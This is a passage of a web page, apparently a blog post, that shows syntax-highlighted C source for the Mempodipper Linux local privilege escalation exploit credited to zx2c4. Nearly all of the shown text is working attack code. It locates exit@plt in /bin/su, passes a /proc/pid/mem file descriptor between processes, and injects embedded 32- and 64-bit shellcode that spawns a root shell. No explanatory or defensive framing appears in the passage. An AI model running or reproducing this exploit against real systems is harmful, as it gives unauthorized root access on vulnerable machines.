</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">execl</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/su</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">su</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">not-a-valid-user</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">unsigned long </span><span style="color:#8fa1b3;">objdump_address</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">FILE *command = </span><span style="color:#bf616a;">popen</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">objdump -d /bin/su|grep &#39;&lt;exit@plt&gt;&#39;|head -n 1|cut -d &#39; &#39; -f 1|sed &#39;s/^[0]*</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">([^0]*</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">)/0x</span><span style="color:#96b5b4;">\\</span><span style="color:#a3be8c;">1/&#39;</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">r</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!command) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] popen</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> result[</span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">];</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">fgets</span><span style="color:#c0c5ce;">(result, </span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">, command);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">pclose</span><span style="color:#c0c5ce;">(command);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#96b5b4;">strtoul</span><span style="color:#c0c5ce;">(result, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">unsigned long </span><span style="color:#8fa1b3;">find_address</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Ptracing su to find next instruction without reading binary.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> address = </span><span style="color:#bf616a;">ptrace_address</span><span style="color:#c0c5ce;">();</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!address) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] Ptrace failed.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Reading su binary with objdump to find exit@plt.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">address = </span><span style="color:#bf616a;">objdump_address</span><span style="color:#c0c5ce;">();</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(address == ULONG_MAX || !address) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] Could not resolve /bin/su. Specify the exit@plt function address manually.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] Usage: </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;"> -o ADDRESS</span><span style="color:#96b5b4;">\n</span><span style="color:#a3be8c;">[-] Example: </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;"> -o 0x402178</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, prog_name, prog_name);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(-</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Resolved call address to 0x</span><span style="color:#d08770;">%lx</span><span style="color:#a3be8c;">.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, address);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return</span><span style="color:#c0c5ce;"> address;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">su_padding</span><span style="color:#c0c5ce;">()</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Calculating su padding.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">FILE *command = </span><span style="color:#bf616a;">popen</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/su this-user-does-not-exist 2&gt;&amp;1</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">r</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(!command) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] popen</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">exit</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> result[</span><span style="color:#d08770;">256</span><span style="color:#c0c5ce;">];</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">fgets</span><span style="color:#c0c5ce;">(result, </span><span style="color:#d08770;">256</span><span style="color:#c0c5ce;">, command);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">pclose</span><span style="color:#c0c5ce;">(command);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#96b5b4;">strstr</span><span style="color:#c0c5ce;">(result, &quot;</span><span style="color:#a3be8c;">this-user-does-not-exist</span><span style="color:#c0c5ce;">&quot;) - result;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">child</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">sock</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> parent_mem[</span><span style="color:#d08770;">256</span><span style="color:#c0c5ce;">];</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">sprintf</span><span style="color:#c0c5ce;">(parent_mem, &quot;</span><span style="color:#a3be8c;">/proc/</span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">/mem</span><span style="color:#c0c5ce;">&quot;, </span><span style="color:#bf616a;">getppid</span><span style="color:#c0c5ce;">());</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Opening parent mem </span><span style="color:#d08770;">%s</span><span style="color:#a3be8c;"> in child.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, parent_mem);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd = </span><span style="color:#bf616a;">open</span><span style="color:#c0c5ce;">(parent_mem, O_RDWR);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(fd &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] open</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Sending fd </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> to parent.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, fd);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#bf616a;">send_fd</span><span style="color:#c0c5ce;">(sock, fd);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">parent</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">unsigned long </span><span style="color:#bf616a;">address</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> sockets[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">];</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Opening socketpair.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">socketpair</span><span style="color:#c0c5ce;">(AF_UNIX, SOCK_STREAM, </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">, sockets) &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] socketpair</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">fork</span><span style="color:#c0c5ce;">()) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Waiting for transferred fd in parent.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">int</span><span style="color:#c0c5ce;"> fd = </span><span style="color:#bf616a;">recv_fd</span><span style="color:#c0c5ce;">(sockets[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">]);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Received fd at </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;">.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, fd);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(fd &lt; </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">) {</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#96b5b4;">perror</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[-] recv_fd</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Assigning fd </span><span style="color:#d08770;">%d</span><span style="color:#a3be8c;"> to stderr.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, fd);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">dup2</span><span style="color:#c0c5ce;">(</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">15</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">dup2</span><span style="color:#c0c5ce;">(fd, </span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">unsigned long</span><span style="color:#c0c5ce;"> offset = address - </span><span style="color:#bf616a;">su_padding</span><span style="color:#c0c5ce;">();</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Seeking to offset 0x</span><span style="color:#d08770;">%lx</span><span style="color:#a3be8c;">.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;, offset);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">lseek64</span><span style="color:#c0c5ce;">(fd, offset, SEEK_SET);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#if defined</span><span style="color:#c0c5ce;">(__i386__)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// See shellcode-32.s in this package for the source.</span><span style="color:#65737e;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> shellcode[] =</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x31\xdb\xb0\x17\xcd\x80\x31\xdb\xb0\x2e\xcd\x80\x31\xc9\xb3</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x0f\xb1\x02\xb0\x3f\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x68\x2f\x2f\x62\x69\x89\xe3\x31\xd2\x66\xba\x2d\x69\x52\x89</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\xe0\x31\xd2\x52\x50\x53\x89\xe1\x31\xd2\x31\xc0\xb0\x0b\xcd</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x80</span><span style="color:#c0c5ce;">&quot;;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#elif defined</span><span style="color:#c0c5ce;">(__x86_64__)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#65737e;">// See shellcode-64.s in this package for the source.</span><span style="color:#65737e;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> shellcode[] =</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xff\xb0\x6a\x0f\x05\x48</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x31\xf6\x40\xb7\x0f\x40\xb6\x02\xb0\x21\x0f\x05\x48\xbb\x2f</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x48\x31\xdb\x66\xbb\x2d\x69\x53\x48\x89\xe1\x48\x31\xc0\x50</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">            </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#96b5b4;">\x51\x57\x48\x89\xe6\x48\x31\xd2\xb0\x3b\x0f\x05</span><span style="color:#c0c5ce;">&quot;;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#else</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#error </span><span style="color:#c0c5ce;">&quot;</span><span style="color:#a3be8c;">That platform is not supported.</span><span style="color:#c0c5ce;">&quot;</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">#endif</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Executing su with shellcode.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">execl</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/bin/su</span><span style="color:#c0c5ce;">&quot;, &quot;</span><span style="color:#a3be8c;">su</span><span style="color:#c0c5ce;">&quot;, shellcode, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">} </span><span style="color:#b48ead;">else </span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">char</span><span style="color:#c0c5ce;"> sock[</span><span style="color:#d08770;">32</span><span style="color:#c0c5ce;">];</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">sprintf</span><span style="color:#c0c5ce;">(sock, &quot;</span><span style="color:#d08770;">%d</span><span style="color:#c0c5ce;">&quot;, sockets[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">]);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">[+] Executing child from child fork.</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#bf616a;">execl</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">/proc/self/exe</span><span style="color:#c0c5ce;">&quot;, prog_name, &quot;</span><span style="color:#a3be8c;">-c</span><span style="color:#c0c5ce;">&quot;, sock, </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">return </span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">;</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">
</span><span style="color:#b48ead;">int </span><span style="color:#8fa1b3;">main</span><span style="color:#c0c5ce;">(</span><span style="color:#b48ead;">int </span><span style="color:#bf616a;">argc</span><span style="color:#c0c5ce;">, </span><span style="color:#b48ead;">char </span><span style="color:#c0c5ce;">**</span><span style="color:#bf616a;">argv</span><span style="color:#c0c5ce;">)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">{</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">prog_name = argv[</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">];</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(argc &gt; </span><span style="color:#d08770;">2 </span><span style="color:#c0c5ce;">&amp;&amp; argv[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">][</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] == &#39;</span><span style="color:#a3be8c;">-</span><span style="color:#c0c5ce;">&#39; &amp;&amp; argv[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">][</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">] == &#39;</span><span style="color:#a3be8c;">c</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">child</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">atoi</span><span style="color:#c0c5ce;">(argv[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">]));</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">===============================</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">=          Mempodipper        =</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">=           by zx2c4          =</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">=         Jan 21, 2012        =</span><span style="color:#96b5b4;">\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#96b5b4;">printf</span><span style="color:#c0c5ce;">(&quot;</span><span style="color:#a3be8c;">===============================</span><span style="color:#96b5b4;">\n\n</span><span style="color:#c0c5ce;">&quot;);</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">if </span><span style="color:#c0c5ce;">(argc &gt; </span><span style="color:#d08770;">2 </span><span style="color:#c0c5ce;">&amp;&amp; argv[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">][</span><span style="color:#d08770;">0</span><span style="color:#c0c5ce;">] == &#39;</span><span style="color:#a3be8c;">-</span><span style="color:#c0c5ce;">&#39; &amp;&amp; argv[</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">][</span><span style="color:#d08770;">1</span><span style="color:#c0c5ce;">] == &#39;</span><span style="color:#a3be8c;">o</span><span style="color:#c0c5ce;">&#39;)</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">parent</span><span style="color:#c0c5ce;">(</span><span style="color:#96b5b4;">strtoul</span><span style="color:#c0c5ce;">(argv[</span><span style="color:#d08770;">2</span><span style="color:#c0c5ce;">], </span><span style="color:#d08770;">NULL</span><span style="color:#c0c5ce;">, </span><span style="color:#d08770;">16</span><span style="color:#c0c5ce;">));</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#b48ead;">else</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">        </span><span style="color:#b48ead;">return </span><span style="color:#bf616a;">parent</span><span style="color:#c0c5ce;">(</span><span style="color:#bf616a;">find_address</span><span style="color:#c0c5ce;">());</span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">    </span><span style="color:#c0c5ce;">
</span><span style="color:#c0c5ce;">}</span><span style="color:#c0c5ce;">
</span></pre>
    </div>

    
    

    <div class="post-footer">
        
            
                <div class="post-tags">
                    
                        <!-- <a href="https:&#x2F;&#x2F;xjump.me&#x2F;tags&#x2F;all&#x2F;">#all</a> -->
                    
                </div>
            
            
                <div class="post-nav">
                    
